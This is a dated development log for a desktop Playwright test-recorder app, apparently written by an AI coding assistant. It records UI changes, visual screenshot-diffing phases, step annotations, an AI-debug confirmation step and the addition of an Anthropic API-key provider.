- **What was done:** Added `disabled?: boolean` to `Step` (both `main/recorder/types.ts` and `renderer/lib/recorder-types.ts`). `script-generator.ts` emits `// disabled — skipped: <line>` for disabled non-structural steps (the spec stays runnable). `spec-parser.ts` preserves `// disabled — skipped:` comment lines through `stripComments` and round-trips them back into `disabled: true` steps. `step-replayer.ts` (single-step preview) returns `ok: true, error: "Skipped — disabled"` for disabled steps. `recorder-service.ts` `replayAll`, `replayFromCurrent`, and `replayFromStart` all skip disabled steps with a `logger.info("recorder", "Step skipped — disabled", { stepIndex })` log; `replayFromCurrent` also streams a `recorder:replayLog` step event with the skip reason. `updateStep` allowlist includes `disabled`. `step-row.tsx` kebab menu adds a "Disable Step" `DropdownMenuCheckboxItem` (same `canContinue` gate as "Continue on Failure") and a "disabled" `Badge` on the row. The Edit Steps (no-trainer) view gets it for free since it passes `onEdit` to `StepRow`. Spec-parser check `__tests__/spec-parser.check.ts` has a disabled round-trip test (mirrors the continueOnFailure test).

### 2026-08-03 — Edit Test (No Trainer): move "+ Add step" to toolbar, rename Save
- **Goal:** In the Edit Steps view (no-trainer mode), move the "+ Add step" button from the bottom footer up next to the "Save" button in the top toolbar, increase button spacing slightly, and rename "Save steps" → "Save".
- **What was done:** In `edit-steps-view.tsx`, moved the `<Plus /> Add step` button into the top toolbar row (before Cancel), increased the toolbar `gap-2` → `gap-3`, and removed the bottom `border-t` footer that previously held it. Renamed the save button label from "Save steps" to "Save" (loading state stays "Saving…"). The inline script-editing flow is unchanged.

### 2026-08-03 — New URL assertion type in "New Assertion" dropdown
- **Goal:** Remove the "pick a kind above" placeholder from the assertion dropdown. Add a new URL assertion type with three variants: URL contains, URL ends with, URL is.
- **What was done:** Added `urlEndsWith` and `urlIs` to `AssertKind` (both `main/recorder/types.ts` and `renderer/lib/recorder-types.ts`). In `recording-view.tsx`, removed the "— pick a kind above —" / "Cancel assertion" separator item from `openAssertMenu`, added an `ASSERT_URL` array (URL contains / URL ends with / URL is) rendered as a second section after a separator. URL assertions need a typed string (not an element click), so selecting one opens the Add-step → Assertion dialog prefilled with that kind (via `setContextPick`/`setAddKind`). Updated `ASSERT_LABEL` with the new kinds. In `add-step-dialog.tsx`, added the three URL kinds to `ASSERT_OPTIONS` (all `pageLevel: true, need: "value"`) with labels "URL contains" / "URL ends with" / "URL is" (the existing `url` entry was relabeled from "Page URL is"). `script-generator.ts` emits `toHaveURL(new RegExp("…$", "i"))` for `urlEndsWith` and `toHaveURL(new RegExp("^…$", "i"))` for `urlIs` (added `reEscape` helper). `step-replayer.ts` handles the new kinds in the preview. `spec-parser.ts` parses `new RegExp(...)` patterns back into `urlEndsWith`/`urlIs`. `describe-step.ts` mirrors the generator for the UI display. `step-row.tsx` inline-edit check includes the new URL kinds. `llm-prompts.ts` AI prompt documents the new kinds. `recorder-service.ts` right-click context menu offers the three URL variants.

### 2026-08-03 — Baseline buttons: confirmation dialogs, rename, hide-after-accept
- **Goal:** Add a confirmation pop-up before accepting baselines (run and step), rename the buttons, and hide per-step buttons after accepting.
- **What was done:** In `visual-view.tsx`, renamed the run-level button from "Accept run as baseline" to "Accept All & Re-baseline" (both the header button and the visual-change banner button) and the step-level button from "Accept as baseline" to "Accept New Baseline". Both buttons are now wrapped in `AlertDialog` (trigger/title/description/confirmLabel/confirmVariant/onConfirm pattern, matching the `ai-debug-panel.tsx` idiom) — the user must explicitly confirm before the baseline is pinned. Added `acceptedSteps: Set<string>` state (reset when the run changes) that tracks which step IDs have been accepted; after a run-level accept, all screenshot-producing step IDs are added (hiding all per-step buttons); after a step-level accept, just that step's ID is added. The run-level header button is hidden when `acceptedSteps.size >= screenshotCount`. The per-step button is hidden when `acceptedSteps.has(step.stepId)`, falling back to the status label text. `AlertDialog` added to the `@glaze/core/components` import.

### 2026-08-03 — Set screenshot(s) as new baseline + Stats logging
- **Goal:** Let the user set any/all screenshots as a new baseline for future visual diffing, with a discoverable button. Log baseline updates in Stats.
- **What was done:** In `visual-view.tsx`, the per-step "Accept as baseline" button now shows for any step with a screenshot (was: only when `diff.state === "changed"`). Added an "Accept run as baseline" button to the replay header (with tooltip) that pins all screenshots from the run — always available when the run has screenshots, not just when there are visual changes. Both mutations show a success toast. Backend `visual-baseline-ops.ts` now calls `runHistoryStore.logBaselineUpdate(...)` after pinning, which appends a `kind: "baseline-update"` RunRecord with a human-readable `note`. `RunRecord` gained `kind?: "run" | "baseline-update"` and `note?: string` fields (both `main/recorder/types.ts` and the renderer mirror). `handlers/index.ts` emits `runs:changed` after accepting so Stats live-refreshes. In `stats-view.tsx`, baseline-update records are excluded from the pass/fail chart and summary cards (only real runs count), but shown in the history table with a gray "Baseline" badge (stamp icon), the note in the Duration column, and "—" in the Log column. The toolbar description shows the baseline-update count alongside the run count.

### 2026-08-03 — Visual view: threshold slider with presets + tooltip
- **Goal:** The raw percent NumberInput for the visual diff threshold was confusing. Replace it with a preset slider and add a hover tooltip.
- **What was done:** In `visual-view.tsx`, replaced `ThresholdControl`'s `NumberInput` with a `Slider variant="filled"` that snaps across 6 presets (Strict 0% / Low 0.1% / Medium 0.5% / High 1% / Lenient 5% / Very lenient 10%), showing the preset label as `startContent` and the percentage as `endContent`. The "Threshold" label + slider are wrapped in a `Tooltip` explaining "Percent of pixels allowed to change before a step is flagged." `NumberInput` import removed; `Slider`, `Tooltip`, `TooltipContent`, `TooltipTrigger` added.

### 2026-08-03 — Restore "Apply to script" button in AI debug dialog (regression fix)
- **Goal:** The "Apply to script" button (with diff preview) disappeared from the full-run `AiDebugDialog` after a failed test — only "Done · Regenerate" showed. Root cause: the `cutAtFailedStep` optimization (commit 0921532) cut the script right after the failed step and told the model "Do NOT output a full-file replacement," so `extractCorrectedScript` never found a complete spec and the apply button never rendered.
- **What was done:** Removed `cutAtFailedStep` and the failed-step truncation from `buildDebugMessages` in `renderer/lib/llm-prompts.ts`. The full script is now always sent (subject only to `MAX_SCRIPT_CHARS` for very long specs), and the "do NOT output a full-file replacement" note only appears when the script is genuinely too long to include — not when a step failed partway through. The model can again produce a complete corrected spec, so the "Apply to script" button + `DiffView` confirm reappear. The `failedStepIndex` prop on `DebugContext` is now unused but retained.

### 2026-08-03 — "Continue on Failure" step utility + step-utilities dropdown submenu
- **Goal:** Add a per-step "Continue on Failure" toggle that tells the runner to swallow a step's failure and keep iterating. Group it with "Refine Selection" under a kebab (`MoreHorizontal`) dropdown that expands beneath the step row.
- **What was done:** Added `continueOnFailure?: boolean` to `Step` (both `main/recorder/types.ts` and the renderer mirror). `script-generator.ts` wraps toggled action/assert steps in `try { … } catch { /* continue on failure */ }` so Playwright doesn't stop the test on that step's failure. `spec-parser.ts` recognizes the try/catch wrapper and sets `continueOnFailure: true` on the re-parsed step (round-trips). Added `continueOnFailure` to the backend `updateStep` allowlist in `recorder-service.ts`. In `step-row.tsx`, replaced the standalone "Refine selector" icon button with a `DropdownMenu` (native macOS menu, `side="bottom"`) triggered by a kebab button — contains "Refine Selection" (only for locator steps) and a `DropdownMenuCheckboxItem` "Continue on Failure" toggle (for action/assert steps, not `if`/`endif`). The kebab only renders when at least one utility applies. A "continue on fail" `Badge` appears on the row when the flag is on. The `EditStepsView` (no-browser editor) also gets the toggle via its existing `onEdit` wiring (no "Refine Selection" there since it has no `onRefine`).
- **UI elements:** `step-row.tsx` — kebab `DropdownMenu` + "continue on fail" badge; `script-generator.ts` — try/catch emission; `spec-parser.ts` — try/catch parsing; `spec-parser.check.ts` — round-trip test.

### 2026-08-03 — Trainer exit: rename button, conditional warning, two-option dialog
- **Goal:** Rename "Stop & generate" to "Save Test" (Training mode) / "Generate Test" (Creation mode). Skip the "Stop training?" warning when there are no unsaved steps (save/exit directly). Reduce the warning dialog from three options to two: "Discard Edits" and "Save & Exit" (removed the "Keep Training" cancel — the dialog's `onOpenChange` already lets the user dismiss it).
- **What was done:** In `recording-view.tsx`, the toolbar button label is now `state.editing ? "Save Test" : "Generate Test"`. Its `onClick` checks `liveSteps.length === 0` — if so, calls `stop()` directly (no dialog); otherwise opens `exitOpen`. The `Dialog` now has `confirmLabel="Save & Exit"` and a single `destructiveAction` "Discard Edits" (calls `discardExit()`). Title/description are mode-aware ("Save changes to this test?" vs "Save this test?").

### 2026-08-03 — "Edit Test" dropdown: Edit in Trainer + Edit Steps (no browser)
- **Goal:** Replace the "Edit in Trainer" button with an "Edit Test" dropdown offering two paths: "Edit in Trainer" (existing behavior — opens the browser in training mode) and "Edit Steps" (add/rearrange/remove steps without opening the browser).
- **What was done:** Replaced the single button with a `DropdownMenu` (native macOS menu) trigger labeled "Edit Test" with a chevron-down. "Edit in Trainer" opens the trainer (same `start()` call; for `scriptEdited` tests, opens the same confirmation dialog, now controlled via `trainerConfirmOpen` state instead of a `Dialog` trigger prop). "Edit Steps" enters a new `editingSteps` mode that replaces the tabbed area with `EditStepsView` (`renderer/main/edit-steps-view.tsx`) — a local draft of the `Step[]` with drag-to-reorder (same `StepRow` drag pattern as the trainer), inline value editing, delete, and an "+ Add step" native menu limited to locator-free types (Go to URL, Wait duration, Set viewport, Press key, Assert page URL, Assert page title — element-targeted steps still need the trainer's browser picker). Save commits via the new `tests:updateSteps` IPC handler, which saves the steps and regenerates the spec from them (unless `scriptEdited`), then invalidates the test/script/tests queries.
- **UI elements:** `test-detail-view.tsx` — toolbar `DropdownMenu` + `EditStepsView` conditional rendering; `edit-steps-view.tsx` — new component (step list editor + `EditStepAddDialog`).
- **Backend elements:** `handlers/index.ts` — new `tests:updateSteps` handler; `api.ts` — new `api.tests.updateSteps` wrapper.

### 2026-08-03 — Sidebar: separate Views section, model status in its own footer
- **Goal:** Keep the ML connection status in its own gradient-blur footer container, and give app-level views (Stats, Visual) their own dedicated section in the sidebar (not in the blurred footer).
- **What was done:** Moved Stats and Visual out of the `Sidebar` `footer` prop back into the scrollable children area, as a dedicated "Views" section (`mt-auto` pushes it to the bottom of the scroll area, with a "Views" label header). The `footer` prop now contains only `AiConnectionFooter`, so the gradient-blur footer is exclusive to the model status.
- **UI elements:** `library-sidebar.tsx` — `Sidebar` footer (AiConnectionFooter only); children = tests list + "Views" section (Stats, Visual).

### 2026-08-03 — Trainer toolbar: combined "New Assertion" button + Hard/Soft tooltips
- **Goal:** Merge the separate "Add assertion:" label and "Choose…" dropdown button into one component, and add hover tooltips explaining Hard vs Soft assertions.
- **What was done:** Removed the standalone "Add assertion:" `Text` label; the dropdown button now reads "New Assertion" (showing the chosen assertion kind once picked) with a `title` tooltip. Added `title` tooltips to the Hard/Soft `SegmentedControlItem`s — Hard: "a failed assertion stops the test run immediately"; Soft: "a failed assertion is reported but the run continues".
- **UI elements:** `recording-view.tsx` — assertion toolbar row (button label + SegmentedControl item titles).

### 2026-08-03 — Sidebar reorganization: Tests front-and-center, app-level nav pinned to bottom
- **Goal:** Reorganize the sidebar so Tests are front and center at the top, and app-level views (Stats, Visual) are pinned at the bottom in a fixed position, above the ML connection status.
- **What was done:** Moved the Stats and Visual `SidebarListItem`s out of the scrollable content area and into the `Sidebar` `footer` prop (alongside `AiConnectionFooter`), so they render in the absolute-positioned bottom container above the ML connection indicator. The tests `SidebarList` is now the sole content in the scroll area.
- **UI elements:** `library-sidebar.tsx` — `Sidebar` footer composition (Stats + Visual + AI status) and children (tests list only).

### 2026-08-03 — Visual-testing Phase 5 (final): wire-up, end-to-end regression, retention revisit
- **Goal:** Close out the roadmap — un-flag the Visual sidebar tab and wire it to the real Phase 2/3/4 views, add ONE end-to-end regression test across the full pipeline, and revisit the Phase 1 retention default against real usage. No deferred scope (component-level diffing, ignore-regions, external alerting, live replay) added.
- **Investigation first:** (1) Sidebar tab was ALREADY un-flagged in Phase 2 — `/visual` routes to the real `VisualView`, subtitle "Screenshot replay", grouped with Stats in the same top `SidebarList`; no "Coming soon" placeholder remained, so nothing to change there (confirmed live). (2) Test convention = standalone `.check.ts` + hand-rolled asserts + non-zero exit (see `spec-parser.check.ts`); no vitest/jest — followed it. (3) `@glaze/core/backend` only resolves via Glaze's runtime ESM hooks (esbuild/tsx can't), which drove the alias-stub test design.
- **What was done:** Extracted `captureMethod`/`buildReplay`/`enrichWithVisualDiffs` from `playwright-runner.ts` into `replay-builder.ts` (pure move) so the correlation+diff brain is testable. Added `visual-pipeline.check.ts` (one path: artifacts→replay→diff-flag→accept-clears→annotation→retention) + `glaze-backend-stub.ts` alias shim + `check:visual-pipeline` npm script. Retention kept at 10 (measured ~0.6 MB/run small test — not wrong).
- **Key decisions:** Test drives REAL stores against a temp `userData` dir (genuine integration, deterministic, no browser) rather than mocking. Kept retention MECHANISM unchanged per the phase constraint — only fixed a correctness bug, didn't redesign.
- **UI elements:** none changed (Visual tab already wired); confirmed nav grouping live.
- **Backend elements:** module extraction (`replay-builder.ts`), regression test harness, artifact-store retention fix.
- **Corrections/Lessons Learned:** The e2e check caught a real latent bug — `artifactStore.pruneRuns`/`listRuns` treated the sibling `baseline/` dir as a prunable run, so after enough runs retention would DELETE the pinned baseline (defeating Phase 3/4's "baseline survives pruning" premise). Fixed with `RESERVED_DIRS = {"baseline"}`. Also: esbuild `--format=esm` breaks on pngjs's dynamic `require` (CJS) — must bundle `--format=cjs`; and the alias stub must read `GLAZE_TEST_USERDATA` lazily (per call) since the check sets it after imports initialize.
- **User Frustrations & Important Remarks:** Phase explicitly required a report (test plan + retention number) before implementing — delivered, then proceeded. Deferred-scope discipline held.

### 2026-08-03 — Visual-testing Phase 4: freeform step notes on the replay timeline
- **Goal:** Let a user attach a freeform text note to a specific step in the Phase 2 replay timeline, persisted alongside the run, visible while scrubbing. Rich text/drawing, real-time collaboration, and edit history explicitly out of scope.
- **Investigation first:** confirmed the Phase 2 attachment point (`ReplayViewer`'s current-step-detail row + timeline scrubber, both keyed on the stable `step.stepId`) and that `test-store.ts`'s flat-JSON-index pattern (`tests.json`) — not the runner-owned, fully-regenerated `replay.json` — was the right persistence model so notes survive replay regeneration and retention pruning.
- **What was done:** Backend — new `annotation-store.ts` (`userData/recorder/annotations.json`, mirrors `test-store.ts`'s list/save shape) with `list(testId,runId)`, `upsert(testId,runId,stepId,text)` (blank text deletes), `deleteTest(testId)` (wired into the existing `tests:delete` handler alongside `artifactStore`/`baselineStore` cleanup). IPC: `annotations:list`, `annotations:upsert`. Frontend — `StepAnnotation` component in `visual-view.tsx`'s current-step-detail row (Add note → Textarea+Save/Cancel → inline text+Edit/Clear), keyed by `step.stepId` to reset per step; notes fetched per-run into a `Map<stepId, Annotation>`; timeline scrubber shows a `MessageSquare` marker for noted steps (when not already showing the failed/changed icon) and appends "· note" to each step's title/aria-label.
- **Key decisions:** one note per `(runId, stepId)` (upsert/overwrite, not a list of notes) — matches the "attach a note to a point" framing in the request; deleting via empty-text upsert rather than a separate delete endpoint, to reuse the same handler/mutation for save and clear.
- **UI elements:** replay viewer step-detail row (add/edit/clear note + inline Textarea), timeline marker icon.
- **Backend elements:** local_storage (`annotations.json`), ipc_handler (`annotations:*`).
- **Corrections/Lessons Learned:** validated live end-to-end — added a note on a passed step and on the failed step, confirmed both persisted correctly in `annotations.json` and surfaced in the timeline's aria-label ("has a note"), then cleared both via the Clear button and confirmed the file returned to `[]` (round-trip create/read/delete all verified before leaving test data in place).
- **User Frustrations & Important Remarks:** None — task explicitly asked for a design report (attachment point + data shape) before implementing; this was lowest-risk/purely-additive so it proceeded straight to implementation after the report rather than pausing for confirmation.

### 2026-08-03 — Visual-testing Phase 3: page-level screenshot diffing vs pinned baseline
- **Goal:** Diff each captured step's screenshot against an explicitly-approved pinned baseline, with a per-test threshold and in-app flagging when a diff exceeds it. Component-level diffing, masks, and external alerting deferred.
- **Design review first (user approved 3 choices via question):** (1) baseline keyed by `Step.id` not URL — a test is deterministic and Step.id survives edits, so it's a far more stable key than a normalized URL; (2) diff lib = **pixelmatch + pngjs** (pure JS, no native bindings → no code-signing/notarization risk vs sharp/looks-same); (3) "Accept as new baseline" = per-run button + per-step option.
- **What was done:** Backend — `visual-diff.ts` (pixelmatch/pngjs, degrades to "unable" on size mismatch/corrupt), `baseline-store.ts` (pinned baselines keyed by Step.id), `visual-baseline-ops.ts` (accept re-pins + patches replay.json). Runner `enrichWithVisualDiffs` runs at run-end after `buildReplay`: seeds baseline on first run ("new-baseline"), else diffs vs pinned baseline, writes `<n>.diff.png` overlays for changed steps, and stamps `ReplayStep.diff`. Added `ReplayStep.stepId/diff`, `RunReplay.visualThreshold`, `RunReplaySummary.changedSteps`, `TestRecord.visualThreshold` (+ `DEFAULT_VISUAL_THRESHOLD` 0.1). IPC: `visual:getThreshold/setThreshold/acceptRun/acceptStep/baselineShot`. Frontend — extended `visual-view.tsx` with DiffBadge, Current/Baseline/Diff `SegmentedControl`, orange visual-change callout + header badge, `NumberInput` threshold, timeline/run-list orange markers, per-step & per-run accept.
- **Key decisions:** diff overlay filename derived from the screenshot's action index (`<n>.diff.png`), not the Step[] index; `readShot` regex widened to allow `.diff.png`. Baselines + overlays stay out of tests.json (binary), deleted with the test.
- **UI elements:** replay viewer (segmented view toggle, badges, callouts, threshold input, timeline), run list markers.
- **Backend elements:** playwright_runner (diff enrichment), local_storage (baseline dir + diff overlays), ipc_handler (`visual:*`), image diff (pixelmatch/pngjs).
- **Corrections/Lessons Learned:** pixelmatch 5.3.0/pngjs 7 ship no TS types → had to add `@types/pixelmatch` + `@types/pngjs` (dev). Validated live end-to-end: ran Wiki Test → seeded 3 baselines ("new-baseline"); re-ran → all "match" (ratio 0); force-swapped one baseline to a solid image → that step flagged "changed 97.5%" with a `.diff.png`, Diff view + Accept-as-baseline both worked and re-pinned on disk. Fixed a quirk where the auto-jump-to-failure effect fired on every replay mutation (accepting a baseline bounced the user off their step) — guarded with a `jumpedRunId` ref.
- **User Frustrations & Important Remarks:** None — user asked for a careful design report before implementation (highest-risk phase), which was delivered and approved before building.

### 2026-08-03 — Visual-testing Phase 2: screenshot-replay timeline
- **Goal:** A passive replay view that scrubs a completed capture run's steps, showing the screenshot + pass/fail per step, with the failure point obvious. No live re-execution/diffing/annotations.
- **What was done:** Runner now persists `replay.json` per captured run (canonical per-step model aligned to `Step[]`). Added `artifactStore` replay read/list + `readShot`; 3 IPC handlers (`artifacts:list`/`getReplay`/`readShot`) + `api.artifacts.*` + mirror types. Rebuilt `visual-view.tsx` from the "coming soon" placeholder into a run-list + scrubber/timeline (screenshot pane, prev/next + ← → keys, colored timeline, red failure callout + auto-jump, per-step "no screenshot" states). Sidebar subtitle → "Screenshot replay".
- **Key decisions:** Per-step outcome did NOT exist persisted → added it. All index correlation (reporter step index / action-order screenshot index / Step[] index) lives once in the runner's `buildReplay`; UI is a dumb reader. Screenshots served as base64 data URLs on demand (one at a time) — no protocol registration needed.
- **UI elements:** sidebar run list, timeline scrubber, screenshot pane, failure callout, empty/skeleton states.
- **Backend elements:** playwright_runner (replay build), local_storage (`replay.json`), ipc_handler (`artifacts:*`).
- **Corrections/Lessons Learned:** First run showed all wrapped actions as `unknown` with null screenshots. Root cause: the capture fixture wraps action methods, so Playwright attributes those steps' location to `glaze-capture.mjs` and the step-reporter's file guard drops them → no reporter status for goto/click/fill on capture runs. Fix: decouple screenshot mapping from status and derive status by combining reporter statuses (asserts/waits) with screenshot presence + failure position. Also caught the manifest `stepIndex` (action order) ≠ `Step[]` index mismatch — handled by method-matched walk. Verified live: Wiki Test capture run → correct `replay.json` (steps 0–2 passed w/ shots, step 3 `waitFor` failed, step 4 skipped, failedIndex 3); Visual tab lists runs, auto-jumps to failure, renders screenshots.
- **User Frustrations & Important Remarks:** none — investigation-first roadmap phase; storage/key scheme prioritized over speed as requested.

### 2026-08-03 — Visual-testing Phase 1: per-step screenshot capture + storage + retention
- **Goal:** During a run with the Phase 0 capture toggle on, screenshot each step and persist it so later phases retrieve by testId/runId/stepId. No diffing/replay/annotations (later phases).
- **What was done:** (1) New `main/services/capture-fixture-source.ts` — the `glaze-capture.mjs` fixture (raw JS string, written next to specs like the step reporter) whose `page` fixture patches page + Locator-prototype action methods to `page.screenshot()` after each action into `GLAZE_ARTIFACT_DIR`, writing `<stepIndex>.png` + `manifest.json`; env-gated (pure `base` passthrough when off), every capture `try/catch`-wrapped so it can never fail/alter the test. (2) New `main/services/artifact-store.ts` — owns `<userData>/recorder/artifacts/<testId>/<runId>/` paths, `pruneRuns` (retain newest N=`DEFAULT_RETAINED_RUNS`=10 run dirs by mtime), `listRuns`/`readManifest` (Phase 2 retrieval), `deleteTest`. (3) `playwright-runner.ts`: mints a fresh `recordId` uuid per run (artifacts dir + RunRecord id — so a test's runs no longer overwrite each other); when `captureArtifacts && !rec.sourceDir`, writes a temp `<recordId>.capture.spec.ts` (line-1 `@playwright/test`→`./glaze-capture.mjs`, preserving line numbers), prunes old runs, creates the run dir, sets env `GLAZE_ARTIFACT_DIR`/`GLAZE_TEST_ID`/`GLAZE_RUN_ID`, runs the temp spec, deletes it after. (4) `run-history-store.append` now accepts an optional pre-minted `id`. (5) Step reporters (both `step-reporter.ts` + `-source.ts`) now filter markers by `step.location.file === test.location.file` so fixture screenshot calls don't emit spurious highlight markers. (6) `tests:delete` handler also calls `artifactStore.deleteTest`.
- **Key decisions (confirmed with user):** capture granularity = **per page-ACTION** (goto/click/fill/check/select/press/etc.; assertions skipped — no new visual state); retention = **last 10 runs per test**. Capture is **app-generated specs only** (imported specs aren't one-action-per-line — same limitation as step highlighting). stepIndex = 0-based action order; `manifest.json` (`{testId,runId,title,status,startedAt,finishedAt,steps:[{index,action,target,value,ok,ts}]}`) is the authoritative per-step artifact+outcome model for runs (there was none before). Mechanism keeps the STORED spec pristine (temp copy at run time) to preserve Script-tab/portability; source-line numbers unchanged so highlighting still works.
- **Verified in running app:** ran Wiki Test with capture on → `artifacts/<testId>/<uuid>/{0,1,2}.png` (valid 1280×720 PNGs, one per action, assertion skipped) + `manifest.json`; manifest.runId === RunRecord.id === dir name (clean join); all steps `ok:true` even though the test FAILED (fault-tolerant); temp spec cleaned up.
- **UI elements:** none (backend/storage only; reuses Phase 0's checkbox).
- **Backend elements:** playwright_runner, local_storage (artifacts dir + manifest.json), ipc_handler (`tests:delete` cleanup), Playwright fixture, env-var plumbing.
- **Corrections/Lessons:** Playwright runs the spec in a SUBPROCESS — `page` exists only in the worker, NOT the backend or the reporter (main process); per-step capture must live in a worker-side fixture. Inside the `captureFixtureSource` template literal use BARE `"` (not `\"`) — escaped quotes trip `no-useless-escape`.

### 2026-08-03 — Visual-testing Phase 0: per-run capture toggle + Visual sidebar tab
- **Goal:** Ship the two low-risk foundations of the visual-testing roadmap (attached `visual-testing-roadmap.md`): a per-run artifact-capture toggle and an empty "coming soon" sidebar tab. No capture/storage/diffing/replay logic (later phases).
- **What was done:** (A) Threaded a `captureArtifacts` boolean through `run(id, capture)` → `api.runner.run` → `runner:run` → `playwrightRunner.start`, which passes env `GLAZE_CAPTURE_ARTIFACTS` to the Playwright subprocess and records it on `RunRecord` (new optional field). Added a "Capture screenshots" `Checkbox` (default off) next to Run test in `test-detail-view.tsx`. (B) Added `renderer/main/visual-view.tsx` (EmptyState placeholder), a `/visual` route, and a "Visual" (Images icon) `SidebarListItem` grouped with Stats in the top `SidebarList`.
- **Key decisions:** Toggle is a per-run option (like `headed`), NOT on `TestRecord` and NOT the DOM-action training recorder — confirmed with user. User chose to expose the toggle UI now (default off) even though capture is inert until a later phase, and to label the tab "Visual". No feature-flag system exists; didn't build one for a single tab (plain placeholder).
- **UI elements:** sidebar nav item, checkbox toggle, toolbar, empty-state view.
- **Backend elements:** ipc_handler (`runner:run`), local_storage (`RunRecord.captureArtifacts`), env-var plumbing to the Playwright subprocess.
- **Corrections/Lessons:** `li.min-w-0:nth-of-type(n)` spans both sidebar `SidebarList`s (Stats/Visual are the first ul, tests the second) — scope or tag when clicking a specific test row in live inspection.

### 2026-08-03 — "Debug with AI" now requires explicit confirmation (review phase)
- **Goal:** When the user clicks the AI Debug Icon (Sparkles) in the run-output console toolbar, show them the full application prompt that will be sent to the model and let them add context before sending. No request is sent without explicit confirmation.
- **What was done:** Rewrote `AiDebugDialog` (`renderer/main/ai-debug-panel.tsx`) to open in a **review phase** instead of auto-starting. Removed the auto-start `useEffect` (which previously fired `runDiagnosis` on the first open for a given run). Added a `reviewing` boolean state (starts `true`, reset `true` on open for a new run). In review, the dialog renders: (1) the memoized `buildDebugMessages(...)` output as read-only "System prompt" + "User prompt" blocks in a `ScrollArea`, (2) a `Field`+`Textarea` "Additional context (optional)" for the user to add notes, (3) a "Cancel" (muted) + "Send to AI" (accent, `Send` icon) button row. "Send to AI" calls `sendDiagnosis`, which appends the trimmed additional context to the last user message (`\n\nAdditional context from the user:\n…`), sets `reviewing=false`, and calls `start()`. The streaming/done/error/cancelled UI (Thinking status, Stop, Regenerate, Apply to script, copy) is unchanged. "Regenerate" now sets `reviewing=true` (returns to the review phase so the user can adjust context before re-sending) instead of re-sending immediately.
- **Key decisions:** Used a `reviewing` state rather than gating on `status === "idle"` because `useLlmChat` state survives across reopens (dialog stays mounted), so after a cancelled/done response `status` is not `idle` — `reviewing` lets us return to the prompt-preview phase on "Regenerate" and on fresh opens for the same run. Additional context is appended to the existing user message (not a new user message) so it stays part of the same diagnostic request. `StepAiDebugDialog` (per-step trainer debug) was intentionally NOT changed — the annotation targeted the full-run dialog opened from the console toolbar.
- **UI elements:** AiDebugDialog (full-run debug, opened from `RunOutput`'s Sparkles button in `renderer/main/run-output.tsx`).
- **Corrections/Lessons Learned:** First build had a leftover `</ScrollArea>` closing tag from the original structure after restructuring the body into review/response branches — removed it. New imports: `Field`, `Text`, `Textarea` from `@glaze/core/components`; `Send` from lucide-react.

### 2026-08-03 — Sidebar AI connection indicator
- **Goal:** Show a subtle indicator at the bottom of the sidebar when the user is connected to a local LLM or Claude; clicking it opens the Settings window on the AI provider section.
- **What was done:** Added `AiConnectionFooter` to `renderer/main/library-sidebar.tsx`, wired via the `Sidebar` `footer` prop (uses `SidebarFooter`). On mount (and on window focus / visibilitychange) it calls `api.llm.getConfig()` then `api.llm.status(provider)`; if `reachable`, renders a `Status variant="success"` dot + muted `Text` "{Provider} connected" (Ollama / LM Studio / Claude). Clicking calls `window:openSettings` IPC (the same handler the app menu uses). Renders nothing when not connected.
- **Key decisions:** Used `llm.status(provider).reachable` (matches the Settings view's own "Connected" definition, including the Anthropic API probe). Label is provider name only (not model) to stay subtle and avoid mismatched-config confusion. Re-checks on focus so a connection just made in Settings is reflected.
- **UI elements:** sidebar footer.
- **Corrections/Lessons Learned:** Initial inline `(window as …).glazeAPI…` expression in the onClick JSX body hit an ESLint parse error (statement-position `(` ambiguity); extracted to a module-scope `openSettingsWindow()` helper, matching the existing `nativeShell()`/`nativeMenu()` pattern.

### 2026-08-03 — Model picker is now a dropdown (Select) instead of a radio group
- **Goal:** User annotated the Settings → AI provider → Model radio group and asked to make it a dropdown menu.
- **What was done:** Replaced the `RadioGroup` of models in `settings-view.tsx` with the `@glaze/core` `Select` component (`Select`/`SelectTrigger`/`SelectValue`/`SelectContent`/`SelectItem`). Same `value`/`onValueChange={handleModelChange}` wiring, so persistence behavior is unchanged. Theme + provider radios left as-is.
- **Key decisions:** Used the design-system `Select` (native macOS menu) rather than hand-rolling. Kept the `Field orientation="horizontal"` + `FieldLabel` layout.
- **UI elements:** settings form (Model field).
- **Corrections/Lessons Learned:** `Label` import stayed (still used by theme/provider radios), so no unused-import lint.
- **User Frustrations & Important Remarks:** Settings is ⌘,-only (no in-app button), so not runtime-demoable via tooling; verified by type-check/lint/build.

### 2026-08-03 — Sensible default Claude model + confirm delete-key / model-select
- **Goal:** Let users delete their Claude API key and pick a default Anthropic model.
- **What was done:** Both controls already existed from the provider work (Settings → Claude: **Clear** button deletes the encrypted key; shared **Model** radio picks + persists the default). Added the one missing polish: `fetchModels` now stable-sorts Anthropic models **Sonnet → Opus → Haiku** so the auto-selected default (`models[0]`) is a balanced general-purpose model instead of an arbitrary API-order entry.
- **Key decisions:** Preference sort via regex on model id (degrades gracefully; no hard dependency on specific model IDs). Kept the shared model radio / clear button rather than adding Claude-only duplicates.
- **UI elements:** settings form (existing Model radio + Clear button).
- **Backend elements:** external api_integration (Anthropic model list).
- **Corrections/Lessons Learned:** The requested capabilities were already present from the prior turn; only the default-model quality was weak.
- **User Frustrations & Important Remarks:** Settings is ⌘,-only (no in-app button), so the branch still isn't runtime-demoable via tooling; verified by type-check/lint/build.

### 2026-08-03 — Add Claude (Anthropic) as an AI provider
- **Goal:** Let users use Claude for test development by connecting their Anthropic account, alongside the existing local LLMs.
- **What was done:** Extended `LlmProvider` to `"ollama"|"lmstudio"|"anthropic"` (backend + renderer types). New `anthropic-key-store.ts` encrypts the API key with `safeStorage`. `llm-service.ts` `runChat`/`fetchModels`/`status` branch to Anthropic's `/v1/messages` (SSE `content_block_delta`) and `/v1/models`, mapped onto the existing `llm:chunk/done/error` events. New IPC `llm:setApiKey`/`clearApiKey`/`hasApiKey`; `asProvider` accepts anthropic. `api.llm.*` wrappers added. Settings screen gains a **Claude** provider radio with a password API-key field (Save/Clear), Connected status, and the shared model radio.
- **Key decisions:** Console **API key** (not OAuth — confirmed with user; OAuth against a Claude subscription isn't supported for third-party API use). **Added alongside** local providers. Key stays backend-only; only `hasKey` booleans cross IPC. No new npm dep or `glaze.capabilities` — plain backend `fetch`. All prompt builders / `useLlmChat` / `ModelPicker` unchanged (provider-agnostic).
- **UI elements:** settings form (provider radio, password input, buttons, status).
- **Backend elements:** encrypted_secret_store (safeStorage), external api_integration (Anthropic), ipc_handlers.
- **Corrections/Lessons Learned:** none.
